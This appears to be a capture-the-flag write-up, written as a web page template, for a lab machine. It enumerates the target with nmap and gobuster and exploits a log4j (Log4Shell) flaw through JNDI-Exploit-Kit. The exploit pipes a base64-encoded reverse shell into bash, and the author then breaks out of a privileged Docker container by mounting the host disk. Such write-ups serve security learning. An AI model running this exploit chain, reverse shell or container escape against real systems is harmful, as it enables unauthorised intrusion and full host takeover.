{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We start off by scanning all the ports.")}}

{{console("nmap -T5 -p- 10.10.189.144", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-14 02:32 CET
Nmap scan report for 10.10.189.144
Host is up (0.075s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 53.70 seconds")}}

{{text("We discover 2 open ports: ")}}

{{list(['22 (SSH)', '80 (HTTP)'])}}

{{text("Let's visit the web page.")}}

{{image("../../static/writeups/lumberjackturtle/images/000001.jpg")}}

{{text("Not a very interesting page. Since it tells us to 'look deeper', we proceed with directory enumerating.")}}

{{console("gobuster dir -u http://10.10.189.144 -w /usr/share/wordlists/dirb/big.txt", "===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.189.144
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/[                    (Status: 400) [Size: 435]
/]                    (Status: 400) [Size: 435]
/error                (Status: 500) [Size: 73]
/plain]               (Status: 400) [Size: 435]
/quote]               (Status: 400) [Size: 435]
/~logs                (Status: 200) [Size: 29]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================")}}

{{text("We visit the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/~logs</code> directory.")}}

{{image("../../static/writeups/lumberjackturtle/images/000002.jpg")}}

{{text("Seems like we still need to go deeper.")}}

{{console("gobuster dir -u http://10.10.189.144/~logs/ -w /usr/share/wordlists/dirb/big.txt", "...
/[                    (Status: 400) [Size: 435]
/]                    (Status: 400) [Size: 435]
/log4j                (Status: 200) [Size: 47]
/plain]               (Status: 400) [Size: 435]
/quote]               (Status: 400) [Size: 435]
...")}}

{{text("We continue to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/~logs/log4j</code>.")}}

{{image("../../static/writeups/lumberjackturtle/images/000003.jpg")}}

{{header("Shell as root?", "shell-as-root")}}

{{text("This page is probably vulnerable to the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>log4j</code> attack.")}}

{{text("While searching for a payload to test this, I came across this article.")}}

{{link("https://raxis.com/blog/log4j-exploit/", "https://raxis.com/wp-content/uploads/2024/02/favicon.png", "Log4j: How to Exploit and Test this Critical Vulnerability")}}

{{text("I caught a request with Burp and used the payload from the article to check if it would work.")}}

{{image("../../static/writeups/lumberjackturtle/images/000004.jpg")}}

{{text("It worked successfully, now we need to get a reverse shell.")}}

{{text("More searching and I came across this GitHub page.")}}

{{link("https://github.com/pimps/JNDI-Exploit-Kit", "./../static/writeups/images/github.jpg", "JNDI-Exploit-Kit")}}

{{text("We download the compiled version onto our machine.")}}

{{text("We visit <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>revshells.com</code> and generate a base64 encoded <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>nc mkfifo</code> reverse shell.")}}

{{text("We run the exploit.")}}

{{console("java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L 'VICTIM_IP:138' -C 'echo YOUR_SHELL | base64 -d | bash'")}}

{{text("Now we set up a listener on the port we specified in the reverse shell and send a request with Burp.")}}

{{image("../../static/writeups/lumberjackturtle/images/000005.jpg")}}

{{text("Be make sure the 'oirpyq' string is set to whatever string it is in the JDK 1.7 build in the exploit.")}}

{{text("We should get a connection.")}}

{{image("../../static/writeups/lumberjackturtle/images/000006.jpg")}}

{{header("Flag", "flag")}}

{{text("After running <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>linpeas</code> we learn that we are in a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>docker</code> container.")}}

{{text("We also learn that privilage mode in enabled, giving us all capabilities to the container.")}}

{{text("Let's check for any drives present.")}}

{{console("fdisk -l", "Disk /dev/xvdf: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/xvdh: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
                                                                                                                                                                        
                                                                                                                                                                        
Disk /dev/xvda: 40 GiB, 42949672960 bytes, 83886080 sectors                                                                                                             
Units: sectors of 1 * 512 = 512 bytes                                                                                                                                   
Sector size (logical/physical): 512 bytes / 512 bytes                                                                                                                   
I/O size (minimum/optimal): 512 bytes / 512 bytes                                                                                                                       
Disklabel type: dos                                                                                                                                                     
Disk identifier: 0x3650a2cc

Device     Boot Start      End  Sectors Size Id Type
/dev/xvda1 *     2048 83886046 83883999  40G 83 Linux")}}

{{text("There is a disk at <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/dev/xvda1</code>.")}}

{{text("I created a folder in the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/tmp</code> directory and mounted the disk there.")}}

{{console("mount /dev/xvda1 /tmp/disk")}}

{{text("We look through the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/tmp/disk/root</code> directory and find a fake flag file. Not fun.")}}

{{text("Fortunately, the real flag wasn't far as there was a folder named <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>...</code> which contained the thing we were looking for.")}}

{{image("../../static/writeups/lumberjackturtle/images/000007.jpg")}}

{{script()}}




